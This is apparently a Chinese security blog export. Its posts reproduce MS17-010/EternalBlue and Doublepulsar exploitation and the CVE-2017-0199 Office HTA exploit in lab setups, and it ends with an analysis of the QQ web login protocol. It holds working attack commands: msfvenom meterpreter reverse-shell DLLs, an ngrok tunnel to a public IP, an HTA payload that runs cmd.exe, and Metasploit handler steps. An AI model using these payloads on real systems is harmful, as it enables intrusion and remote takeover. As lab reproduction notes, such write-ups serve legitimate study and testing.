<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.....</span><br><span class="line">10.50.2.52</span><br><span class="line">10.50.2.62</span><br><span class="line">10.50.2.65</span><br><span class="line">10.50.2.61</span><br><span class="line">10.50.2.63</span><br><span class="line">10.50.2.64</span><br><span class="line">10.50.2.76</span><br><span class="line">10.50.2.69</span><br><span class="line">10.50.2.77</span><br><span class="line">10.50.2.78</span><br><span class="line">10.50.2.79</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
<p>有了存在漏洞的地址，接下来将开始对其进行验证，以10.50.2.62为例。<br>由于Kali在虚拟机，宿主机IP为2.0.<em>.</em>，目标机在10.50.2.*。相当于需要从内网到另一个内网， 选择采用了ngrok进行tcp的端口转发来实现内网的穿透。</p>
<h3 id="0x02-内网穿透"><a href="#0x02-内网穿透" class="headerlink" title="0x02 内网穿透"></a>0x02 内网穿透</h3><p>这里采用了www.ngrok.cc平台进行演示，类似这样的平台有很多，例如natapp.cn等。<br>注册并开通隧道，如图所示。</p>
<p><img src="/2017/04/21/MS17-010-Vulnerability-Detection-And-Ngrok/内网穿透之开通隧道.png" alt="内网穿透之开通隧道"></p>
<p>下载对应的客户端，下载地址为：<a href="https://www.ngrok.cc/#down-client" target="_blank" rel="noopener">https://www.ngrok.cc/#down-client</a> ，选择与系统对应的软件。<br>我这里Kali为64位的，下载和使用命令如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Downloads<span class="comment"># wget hls.ctopus.com/sunny/linux_amd64.zip</span></span><br><span class="line">root@kali:~/Downloads<span class="comment"># unzip  linux_amd64.zip</span></span><br><span class="line">root@kali:~/Downloads<span class="comment"># cd linux_amd64/</span></span><br><span class="line">root@kali:~/Downloads/linux_amd64<span class="comment"># ls</span></span><br><span class="line">root@kali:~/Downloads/linux_amd64<span class="comment"># ./sunny clientid 隧道ID</span></span><br></pre></td></tr></table></figure>
<p><img src="/2017/04/21/MS17-010-Vulnerability-Detection-And-Ngrok/启动ngrok.png" alt="启动ngrok"><br>出现下图的界面表示运行成功。<br><img src="/2017/04/21/MS17-010-Vulnerability-Detection-And-Ngrok/ngrok启动成功.png" alt="ngrok启动成功"></p>
<p>使用如下命令生成用于监听的dll文件。监听的IP为server.ngrok.cc的地址，端口为开通隧道时填写的远程端口。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Documents<span class="comment"># msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=47.90.92.56  LPORT=6266 -f dll &gt; got.dll</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/2017/04/21/MS17-010-Vulnerability-Detection-And-Ngrok/生成监听dll文件.png" alt="生成监听dll文件"></p>
<p>然后在Kali上设置监听本机的IP和端口，也就是在开通隧道时填写的本地端口。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.232.134</span><br><span class="line"><span class="built_in">set</span> LPORT 5555</span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; exploit</span><br></pre></td></tr></table></figure></p>
<p><img src="/2017/04/21/MS17-010-Vulnerability-Detection-And-Ngrok/监听.png" alt="监听"></p>
<p>由于关于Eternalblue利用方法有很多教程了，这里就不详细说明了，如图所示。<br><img src="/2017/04/21/MS17-010-Vulnerability-Detection-And-Ngrok/设置过程.png" alt="设置过程"><br><img src="/2017/04/21/MS17-010-Vulnerability-Detection-And-Ngrok/利用成功.png" alt="利用成功"><br>攻击成功时查看ngrok客户端发现有一个连接。<br><img src="/2017/04/21/MS17-010-Vulnerability-Detection-And-Ngrok/ngrok连接成功.png" alt="ngrok连接成功"><br>而且Kali上也生成了一个meterpreter会话。<br><img src="/2017/04/21/MS17-010-Vulnerability-Detection-And-Ngrok/返回meterpreter会话.png" alt="返回meterpreter会话"><br>之后的操作就很简单了，可以添加用户等等。<br>最后远程登录成功如下图所示。<br><img src="/2017/04/21/MS17-010-Vulnerability-Detection-And-Ngrok/靶机成功.png" alt="靶机成功"><br>使用natapp也是可以的。<br><img src="/2017/04/21/MS17-010-Vulnerability-Detection-And-Ngrok/natapp连接成功.png" alt="natapp连接成功"></p>
<h3 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h3><p>本文主要以MS17-010为例，讲解了如何下载和利用Metasploit中没有的模块，以及如何解决内网到内网的穿透的问题，当然解决的方法还有很多，这里就不再介绍了。</p>
<blockquote>
<p>没有什么新的知识，怕忘记所以记录一下~~</p>
</blockquote>
<h3 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h3><p>[1]<a href="https://www.exploit-db.com/exploits/41891/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/41891/</a><br>[2]<a href="http://bobao.360.cn/learning/detail/3041.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/3041.html</a></p>
]]></content>
      
        <categories>
            
            <category> Exploit </category>
            
        </categories>
        
        
        <tags>
            
            <tag> MS17-010 </tag>
            
            <tag> Metasploit </tag>
            
            <tag> Ngrok </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CVE-2017-0199漏洞复现过程]]></title>
      <url>/2017/04/18/CVE-2017-0199%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
      <content type="html"><![CDATA[<blockquote>
<p>记录一下过程，周日已经出了结果，但是过程忘记了，抽空再次实现了一下。结尾附上利用MSF生成exploit（外国黑客城会玩）。</p>
</blockquote>
<h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>一台apache服务器（这里我用Kali）、POC和一个Word文档。<br>POC内容大概如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">a=new ActiveXObject(<span class="string">"WScript.Shell"</span>);</span><br><span class="line">a.run(<span class="string">'%windir%\\System32\\cmd.exe /c calc.exe'</span>, 0);window.close();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<a id="more"></a>
<p>Word文档内容任意。<br><img src="/2017/04/18/CVE-2017-0199漏洞复现过程/Word文档内容.png" alt="Word文档内容"></p>
<p>然后将其放在Kali服务器上<br>Apache需要开启DAV支持，具体命令如下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a2enmod dav  </span><br><span class="line">a2enmod dav_fs  </span><br><span class="line">a2enmod dav_lock  </span><br><span class="line">a2enmod headers</span><br></pre></td></tr></table></figure></p>
<p><img src="/2017/04/18/CVE-2017-0199漏洞复现过程/apache配置.png" alt="apache配置"></p>
<h3 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h3><p>在web目录新建ms文件夹，将test.docx复制到ms目录下，并重命名为test.rtf<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">root@kali:~/Documents<span class="comment"># cp test.docx /var/www/html/ms/test.rtf</span></span><br></pre></td></tr></table></figure></p>
<p>新建Word文档，插入对象<br>如图<br><img src="/2017/04/18/CVE-2017-0199漏洞复现过程/新建exploit文档.png" alt="新建exploit文档"></p>
<p>并保存为rtf文件，如233.rtf<br>删除服务器上的test.rtf文件<br>并将poc.hta文件复制到ms目录下，并改名为test.rtf<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/var/www/html/ms<span class="comment"># rm -rf test.rtf </span></span><br><span class="line">root@kali:~/Documents<span class="comment"># cp poc.hta  /var/www/html/ms/test.rtf</span></span><br></pre></td></tr></table></figure></p>
<p>修改Apache配置</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;Directory /&gt;  </span><br><span class="line">Dav on  </span><br><span class="line">&lt;/Directory&gt;  </span><br><span class="line"></span><br><span class="line"> &lt;Directory /var/www/html/ms/&gt;  </span><br><span class="line">Header <span class="built_in">set</span> Content-Type <span class="string">"application/hta"</span>  </span><br><span class="line">&lt;/Directory&gt;</span><br></pre></td></tr></table></figure>
<p><img src="/2017/04/18/CVE-2017-0199漏洞复现过程/修改Apache配置.png" alt="修改Apache配置"></p>
<p>并重启服务器<code>service apache2 restart</code></p>
<p>打开233.rtf文档</p>
<p>双击word文档的文字，将会有惊喜弹出</p>
<p><img src="/2017/04/18/CVE-2017-0199漏洞复现过程/计算器弹出.png" alt="计算器弹出"></p>
<p>打开文档就弹出的话需要将<code>\object\objautlink\rsltpict</code>修改为<br><code>\object\objautlink\objupdate\rsltpict</code><br><img src="/2017/04/18/CVE-2017-0199漏洞复现过程/修改对比.png" alt="修改对比"></p>
<p>再次打开文件</p>
<p><img src="/2017/04/18/CVE-2017-0199漏洞复现过程/执行过程.gif" alt="执行过程"></p>
<h3 id="彩蛋（MSF下的实现）"><a href="#彩蛋（MSF下的实现）" class="headerlink" title="彩蛋（MSF下的实现）"></a>彩蛋（MSF下的实现）</h3><p>在kali下执行。<br>首先更新msf到最新。（假设你们都完成了这个过程）</p>
<h4 id="下载利用脚本"><a href="#下载利用脚本" class="headerlink" title="下载利用脚本"></a>下载利用脚本</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/usr/share/metasploit-framework/modules/exploits/windows/fileformat<span class="comment"># wget https://raw.githubusercontent.com/nixawk/metasploit-framework/3d082814cbedc065f329498b9c6fb7951f8ebbd5/modules/exploits/windows/fileformat/office_word_hta.rb</span></span><br></pre></td></tr></table></figure>
<p>然后msf下执行命令<code>reload_all</code>重新加载模块</p>
<p><img src="/2017/04/18/CVE-2017-0199漏洞复现过程/下载并加载脚本.png" alt="下载并加载脚本"></p>
<p>下载rtf文件到<code>/usr/share/metasploit-framework/data/exploits</code>目录</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/share/metasploit-framework/data/exploits</span><br><span class="line"></span><br><span class="line">wget https://raw.githubusercontent.com/nixawk/metasploit-framework/3d082814cbedc065f329498b9c6fb7951f8ebbd5/data/exploits/cve-2017-0199.rtf</span><br></pre></td></tr></table></figure>
<h4 id="开启hta服务"><a href="#开启hta服务" class="headerlink" title="开启hta服务"></a>开启hta服务</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/windows/misc/hta_server</span><br><span class="line">msf exploit(hta_server) &gt; show options</span><br><span class="line">msf exploit(hta_server) &gt; run</span><br></pre></td></tr></table></figure>
<p><img src="/2017/04/18/CVE-2017-0199漏洞复现过程/开启hta服务.png" alt="开启hta服务"></p>
<h4 id="生成exploit文档"><a href="#生成exploit文档" class="headerlink" title="生成exploit文档"></a>生成exploit文档</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(hta_server) &gt; use exploit/windows/fileformat/office_word_hta</span><br><span class="line">msf exploit(office_word_hta) &gt; show options</span><br><span class="line">msf exploit(office_word_hta) &gt; <span class="built_in">set</span> TARGETURI http://192.168.232.134:8080/4Jmy4cmcZZV7pwi.hta</span><br><span class="line">msf exploit(office_word_hta) &gt; <span class="built_in">set</span> FILENAME msf.doc</span><br><span class="line">msf exploit(office_word_hta) &gt; run</span><br></pre></td></tr></table></figure>
<p><img src="/2017/04/18/CVE-2017-0199漏洞复现过程/生成恶意文档.png" alt="生成恶意文档"></p>
<p>将生成的msf.doc文件复制到windows上，打开即可获取一个会话</p>
<p>如下所示</p>
<h5 id="WIndows下结果"><a href="#WIndows下结果" class="headerlink" title="WIndows下结果"></a>WIndows下结果</h5><p><img src="/2017/04/18/CVE-2017-0199漏洞复现过程/Windows上打开结果.png" alt="Windows上打开结果"></p>
<h5 id="Kali下结果"><a href="#Kali下结果" class="headerlink" title="Kali下结果"></a>Kali下结果</h5><p><img src="/2017/04/18/CVE-2017-0199漏洞复现过程/Kali上结果.png" alt="Kali上结果"></p>
<h4 id="附加"><a href="#附加" class="headerlink" title="附加"></a>附加</h4><h5 id="如何判断是否收到影响（2017-04-19）"><a href="#如何判断是否收到影响（2017-04-19）" class="headerlink" title="如何判断是否收到影响（2017.04.19）"></a>如何判断是否收到影响（2017.04.19）</h5><p>新建word文档-&gt;插入-&gt;对象-&gt;对象-&gt;由文件创建<br>在文件名中输入获取的hta链接，并选中链接到文件<br>如果出现如下结果，则说明收到影响</p>
<p><img src="/2017/04/18/CVE-2017-0199漏洞复现过程/检测.gif" alt="检测是否收到影响"></p>
<p>如果仅仅出现下面的弹窗，则说明不瘦影响，就不需要接下来的测试了。。<br><img src="/2017/04/18/CVE-2017-0199漏洞复现过程/出错弹窗.png" alt="出错弹窗"></p>
<blockquote>
<p>主机和虚拟机镜像采用的同一套系统，Office用的也一样，但是虚拟机不可以，而主机可以。我也不知道为啥····</p>
</blockquote>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="http://rewtin.blogspot.nl/2017/04/cve-2017-0199-practical-exploitation-poc.html?m=1" target="_blank" rel="noopener">http://rewtin.blogspot.nl/2017/04/cve-2017-0199-practical-exploitation-poc.html?m=1</a><br><a href="https://github.com/rapid7/metasploit-framework/pull/8254" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/pull/8254</a></p>
]]></content>
      
        <categories>
            
            <category> Exploit </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CVE-2017-0199 </tag>
            
            <tag> office漏洞 </tag>
            
            <tag> Msf </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[方程式漏洞利用之SMB]]></title>
      <url>/2017/04/15/%E6%96%B9%E7%A8%8B%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B9%8BSMB/</url>
      <content type="html"><![CDATA[<blockquote>
<p>测试过程中发现了许多问题，导致不成功，记录一下过程以及在其中遇到问题的解决方法</p>
</blockquote>
<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><table>
<thead>
<tr>
<th>主机</th>
<th>IP</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>Win7 64位</td>
<td>192.168.232.133</td>
<td>靶机（开启smb）</td>
</tr>
<tr>
<td>XP</td>
<td>192.168.232.128</td>
<td>攻击机1</td>
</tr>
<tr>
<td>Kali</td>
<td>192.168.232.134</td>
<td>攻击机2</td>
</tr>
</tbody>
</table>
<a id="more"></a>
<h5 id="攻击机软件安装"><a href="#攻击机软件安装" class="headerlink" title="攻击机软件安装"></a>攻击机软件安装</h5><p>1.下载<a href="https://github.com/x0rz/EQGRP_Lost_in_Translation/tree/master/windows" target="_blank" rel="noopener">https://github.com/x0rz/EQGRP_Lost_in_Translation/tree/master/windows</a><br>2.<strong>安装Python2.6 32位</strong><br><img src="/2017/04/15/方程式漏洞利用之SMB/python版本.png" alt="python版本"></p>
<p>安装后，运行fb.py，发现错误<code>ImportError: No module named win32pipe</code></p>
<p><img src="/2017/04/15/方程式漏洞利用之SMB/win32pipe错误.png" alt="win32pipe错误"></p>
<p>搜索后提示需要安装<code>pywin32-216.win32-py2.6.exe</code>，下载地址<a href="https://sourceforge.net/projects/pywin32/files%2Fpywin32/" target="_blank" rel="noopener">https://sourceforge.net/projects/pywin32/files%2Fpywin32/</a><br>选择对应的版本。<br>结果又发现错误</p>
<p><img src="/2017/04/15/方程式漏洞利用之SMB/找不到指定的模块.png" alt="找不到指定的模块"></p>
<p>切换到Python的安装目录的Scripts下，执行命令<code>pywin32_postinstall.py -install</code><br><img src="/2017/04/15/方程式漏洞利用之SMB/解决找不到模块.png" alt="解决找不到模块"></p>
<p>运行fb.py报错，在fb.py同目录下创建listeningposts文件夹即可<br><img src="/2017/04/15/方程式漏洞利用之SMB/创建目录.png" alt="创建目录"></p>
<h3 id="验证过程"><a href="#验证过程" class="headerlink" title="验证过程"></a>验证过程</h3><p>运行fb.py后输入靶机和攻击机XP的IP，新建或者用之前的项目<br><img src="/2017/04/15/方程式漏洞利用之SMB/操作1.png" alt="操作1"><br>之后一路回车，需要操作的地方已经标记<br>选择SMB工具模块，使用命令<code>use Eternalblue</code><br><img src="/2017/04/15/方程式漏洞利用之SMB/操作2.png" alt="操作2"><br>选择目标系统<br><img src="/2017/04/15/方程式漏洞利用之SMB/操作3.png" alt="操作3"><br>输入命令<code>use Doublepulsar</code><br><img src="/2017/04/15/方程式漏洞利用之SMB/操作4.png" alt="操作4"><br><img src="/2017/04/15/方程式漏洞利用之SMB/操作5.png" alt="操作5"></p>
<p>在Kali上生成dll文件，命令如下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.232.134  LPORT=5555 <span class="_">-f</span> dll &gt; s.dll</span><br></pre></td></tr></table></figure></p>
<p>然后copy到XP系统中，记下位置，如C:\s.dll<br>kali上运行msf，具体命令如下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> LHOST 192.168.232.134</span><br><span class="line">LHOST =&gt; 192.168.232.134</span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> LPORT 5555</span><br><span class="line">LPORT =&gt; 5555</span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> PAYLOAD windows/x64/meterpreter/reverse_tcp</span><br><span class="line">PAYLOAD =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; exploit</span><br></pre></td></tr></table></figure></p>
<p><img src="/2017/04/15/方程式漏洞利用之SMB/操作6.png" alt="操作6"></p>
<p>在XP上输入dll文件的位置，一路回车<br><img src="/2017/04/15/方程式漏洞利用之SMB/操作7.png" alt="操作7"><br>显示Doublepulsar Succeeded<br><img src="/2017/04/15/方程式漏洞利用之SMB/操作8.png" alt="操作8"></p>
<p>查看kali上发现已经反弹shell 了<br><img src="/2017/04/15/方程式漏洞利用之SMB/成功反弹.png" alt="成功反弹"></p>
<h3 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h3><p>现在网上已经有很多文章了，这里只是自己验证一下实现的过程，记录一下。其实复现也很容易，只需要输入IP地址和一些选项即可，就是搭建环境的时候有许多错误，注意一下就行了。<br>这里有视频可以看一下<a href="https://v.qq.com/iframe/player.html?vid=g0393qtgvj0&amp;tiny=0&amp;auto=0" target="_blank" rel="noopener">https://v.qq.com/iframe/player.html?vid=g0393qtgvj0&amp;tiny=0&amp;auto=0</a></p>
]]></content>
      
        <categories>
            
            <category> Exploit </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 方程式 </tag>
            
            <tag> SMB漏洞 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[QQ登录简单分析，附易语言登录代码]]></title>
      <url>/2017/04/10/QQ%E7%99%BB%E5%BD%95%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90%EF%BC%8C%E9%99%84%E6%98%93%E8%AF%AD%E8%A8%80%E7%99%BB%E5%BD%95%E4%BB%A3%E7%A0%81/</url>
      <content type="html"><![CDATA[<p>这里参考了QQ登录的组件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ui.ptlogin2.qq.com/cgi-bin/login?hide_title_bar=0&amp;low_login=0&amp;qlogin_auto_login=1&amp;no_verifyimg=1&amp;link_target=blank&amp;appid=636014201&amp;target=self&amp;s_url=http%3A//www.qq.com/qq2012/loginSuccess.htm</span><br></pre></td></tr></table></figure></p>
<a id="more"></a>
<p><img src="/2017/04/10/QQ登录简单分析，附易语言登录代码/登录组件.png" alt="登录组件"></p>
<p>QQ登录有两种情况，一种是需要验证码，一种是不需要验证码。需要验证码的稍微复杂一点，这里首先介绍一下不需要验证码的情况。</p>
<h3 id="一、无需验证码"><a href="#一、无需验证码" class="headerlink" title="一、无需验证码"></a>一、无需验证码</h3><h4 id="第一步：获取-login-sig"><a href="#第一步：获取-login-sig" class="headerlink" title="第一步：获取 login_sig"></a>第一步：获取 login_sig</h4><p>这是登录所需要的第一步，无论是否需要验证码，都需要进行这一步。<br>访问如下地址：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ui.ptlogin2.qq.com/cgi-bin/login?hide_title_bar=0&amp;low_login=0&amp;qlogin_auto_login=1&amp;no_verifyimg=1&amp;link_target=blank&amp;appid=636014201&amp;target=self&amp;s_url=http%3A//www.qq.com/qq2012/loginSuccess.htm</span><br></pre></td></tr></table></figure></p>
<p>从返回的Cookie中获取 pt_login_sig的值，这个值就是login_sig</p>
<p><img src="/2017/04/10/QQ登录简单分析，附易语言登录代码/获取login_sig的值.png" alt="获取login_sig的值"></p>
<h4 id="第二步：获取-checkVC"><a href="#第二步：获取-checkVC" class="headerlink" title="第二步：获取 checkVC"></a>第二步：获取 checkVC</h4><p>这个字符串中包含了多个内容。有是否输入验证码的标志、verifycode、salt和pt_verifysession_v1（<strong>不需要输入验证码的情况下</strong>）。<br>请求地址：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://check.ptlogin2.qq.com/check?regmaster=&amp;pt_tea=2&amp;pt_vcode=1&amp;uin=QQ号码&amp;appid=636014201&amp;js_ver=10197&amp;js_type=1&amp;login_sig=GsmtnCcla5xHKS********T0U0npqlnD4bzXEMed&amp;u1=http%3A%2F%2Fwww.qq.com%2Fqq2012%2FloginSuccess.htm&amp;r=0.23528769960244944&amp;pt_uistyle=40</span><br></pre></td></tr></table></figure>
<p>其中参数uin是登录的qq号码，login_sig是从第一步获取的值。<br><img src="/2017/04/10/QQ登录简单分析，附易语言登录代码/获取check_vc.png" alt="获取check_vc"><br>当然这种情况是在QQ号输入正确，并且不需要输入验证码时。<br>返回的内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ptui_checkVC(&apos;0&apos;,&apos;!BAF&apos;,&apos;\x00******\x64\x21\x97\x92&apos;,&apos;e9825f1e232302e01414bf9c37ac7d44942a40c89daaf5604ab11d54fff32445ad89e315e30a610e0aa77f46afedbaad83819c14230e7ec2&apos;,&apos;2&apos;);</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>第一个值表示是否需要图片验证码，0表示不需要<br>    第二值是verifycode，登录时需要<br>    第三个值是salt，QQ转换而来<br>    第四个值是pt_verifysession_v1</p>
</blockquote>
<h4 id="第三步：登录"><a href="#第三步：登录" class="headerlink" title="第三步：登录"></a>第三步：登录</h4><p>输入密码后点登录，请求包为：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ptlogin2.qq.com/login?u=QQ号码&amp;verifycode=!BAF&amp;pt_vcode_v1=0&amp;pt_verifysession_v1=e9825f1e232302e01414bf9c37ac7d44942a40c89daaf5604ab11d54fff32445ad89e315e30a610e0aa77f46afedbaad83819c14230e7ec2&amp;p=w79Tqqx2glOF9meNNWhz5Ouow23EGt3zEl-y8vpVGFuHT6HJaFtRhVDlbpMj4a6plyrnIvW73uGXzVDwSt2e9wMHyFt9crtZ-N0xUx2wxFUen03ybw5HxzkPti3VyjSffID8GNkhDn1yYVPa1lyjHED2DCVd3rl9bysBPb*1imLSYY3jkQJpsXPS2kjxxlVxFBVHEHnSGSYaA3QBMXQ*NyQw7MkhVDsO7X8aljR0eApa*lgHoBsC4g3mTtEKcU5aslpcO4EPdUey0QA4YVh9zLzbLnkPJklcQYvoxlv6kLdYmoyORcVTM6IKqles7t5ot0mRWzjW923hV3X0PLRb6g__&amp;pt_randsalt=2&amp;u1=http%3A%2F%2Fwww.qq.com%2Fqq2012%2FloginSuccess.htm&amp;ptredirect=0&amp;h=1&amp;t=1&amp;g=1&amp;from_ui=1&amp;ptlang=2052&amp;action=4-8-1488010172151&amp;js_ver=10197&amp;js_type=1&amp;login_sig=GsmtnCcla5xHKSrRZ7ek0VU5-63oyUvqLk65vxoIG0kOFBT0U0npqlnD4bzXEMed&amp;pt_uistyle=40&amp;aid=636014201&amp;</span><br></pre></td></tr></table></figure></p>
<table>
<thead>
<tr>
<th>参数名称</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>u</td>
<td>用户输入。第二步骤中  uin的值</td>
</tr>
<tr>
<td>verifycode</td>
<td>第二步中ptui_checkVC第二个值。(这里的是!BAF)</td>
</tr>
<tr>
<td>pt_verifysession_v1</td>
<td>第二步中ptui_checkVC第四个值。即e9825f1….</td>
</tr>
<tr>
<td>p</td>
<td>加密后的密码</td>
</tr>
<tr>
<td>login_sig</td>
<td>第一步中返回Cookie中的 pt_login_sig值</td>
</tr>
<tr>
<td>pt_randsalt</td>
<td>pt_randsalt=0  旧版加密 ；pt_randsalt=2 新版RSA加密</td>
</tr>
</tbody>
</table>
<p>密码加密的js代码地址<code>http://imgcache.qq.com/ptlogin/ver/10197/js/c_login_2.js</code>，注意看js版本，这里是js_ver为10197</p>
<blockquote>
<p>密码加密需要三个参数，第一个是pwd（用户密码），第二个是salt（第二步中获取ptui_checkVC 中的第三个值），第三个是verifycode（第二步中ptui_checkVC第二个值 ）</p>
</blockquote>
<p>用户名密码正确返回：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ptuiCB(&apos;0&apos;,&apos;0&apos;,&apos;http://www.qq.com/qq2012/loginSuccess.htm&apos;,&apos;0&apos;,&apos;登录成功！&apos;, &apos;QQ昵称&apos;);</span><br></pre></td></tr></table></figure></p>
<p>用户名密码错误返回：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ptuiCB(&apos;3&apos;,&apos;0&apos;,&apos;&apos;,&apos;0&apos;,&apos;您输入的帐号或密码不正确，请重新输入。&apos;, &apos;&apos;);</span><br></pre></td></tr></table></figure>
<p>附上一张登录成功的截图<br><img src="/2017/04/10/QQ登录简单分析，附易语言登录代码/无验证码登录成功.png" alt="无验证码登录成功"></p>
<h3 id="二、需要输入验证码"><a href="#二、需要输入验证码" class="headerlink" title="二、需要输入验证码"></a>二、需要输入验证码</h3><h4 id="第一步：获取login-sig"><a href="#第一步：获取login-sig" class="headerlink" title="第一步：获取login_sig"></a>第一步：获取login_sig</h4><p>与上面无需验证码一样，就省略了。</p>
<h4 id="第二步：获取cap-cd"><a href="#第二步：获取cap-cd" class="headerlink" title="第二步：获取cap_cd"></a>第二步：获取cap_cd</h4><p>请求：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://check.ptlogin2.qq.com/check?regmaster=&amp;pt_tea=2&amp;pt_vcode=1&amp;uin=987654321&amp;appid=636014201&amp;js_ver=10197&amp;js_type=1&amp;login_sig=KVSX9JmFKqCXlNi85SLXJnj5DqKPDzAYGwW3X5d3Wcnxd885YPFSeDU7ul15aTQp&amp;u1=http%3A%2F%2Fwww.qq.com%2Fqq2012%2FloginSuccess.htm&amp;r=0.8539291708517738&amp;pt_uistyle=40</span><br></pre></td></tr></table></figure></p>
<p>返回<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ptui_checkVC(&apos;1&apos;,&apos;yrAL1AMRbUpQGrsQxy6HMhVQ1YIf--U0zK5wNm_wTOYi2YIrxt5H5w**&apos;,&apos;\x00\x00\x00\x00\x3a\xde\x68\xb1&apos;,&apos;&apos;,&apos;2&apos;);</span><br></pre></td></tr></table></figure></p>
